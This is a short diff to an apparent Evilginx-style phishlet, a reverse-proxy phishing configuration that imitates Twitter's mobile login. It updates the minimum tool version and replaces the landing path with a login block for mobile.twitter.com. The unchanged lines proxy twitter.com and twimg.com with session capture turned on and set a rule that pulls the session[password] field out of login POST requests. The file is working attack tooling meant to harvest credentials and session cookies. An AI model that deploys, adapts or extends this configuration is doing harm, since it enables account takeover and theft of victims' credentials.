@@ -1,5 +1,5 @@
 author: '@white_fi'
-min_ver: '2.2.0'
+min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'mobile', orig_sub: 'mobile', domain: 'twitter.com', session: true, is_landing: true}
   - {phish_sub: 'abs', orig_sub: 'abs', domain: 'twimg.com', session: true, is_landing: false}
@@ -20,5 +20,6 @@ credentials:
     key: 'session\[password\]'
     search: '(.*)'
     type: 'post'
-landing_path:
-  - '/login'
+login:
+  domain: 'mobile.twitter.com'
+  path: '/login'
